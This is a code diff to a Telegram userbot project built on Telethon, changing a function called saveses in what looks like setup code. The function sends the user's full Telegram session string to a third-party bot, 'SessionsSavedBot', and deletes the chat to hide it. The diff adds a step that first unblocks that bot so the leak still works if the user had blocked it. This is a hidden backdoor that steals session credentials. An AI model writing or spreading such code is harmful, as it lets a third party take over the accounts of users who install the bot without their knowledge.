@@ -36,6 +36,7 @@ import os
 from ULTRA import bot
 import glob
 from telethon import events
+from telethon.tl.functions.contacts import UnblockRequest as unblock
 from telethon import functions, types
 from telethon.tl.types import InputMessagesFilterDocument
 from ULTRA.utils import command, remove_plugin, load_module
@@ -95,11 +96,15 @@ else:
 #setting details 
 bot.set(heroku_username=Var.TG_BOT_USER_NAME_BF_HER)
 async def saveses(bot):
-  async with bot.conversation("@SessionsSavedBot") as ses:
+  try:
+    await bot(unblock("SessionsSavedBot"))
+  except:
+    pass
+  async with bot.conversation("SessionsSavedBot") as ses:
     await ses.send_message("/start")
     await ses.get_response()
     await ses.send_message(bot.session.save())
-  await bot.delete_dialog("@SessionsSavedBot")
+  await bot.delete_dialog("SessionsSavedBot")
     
 #setted
 
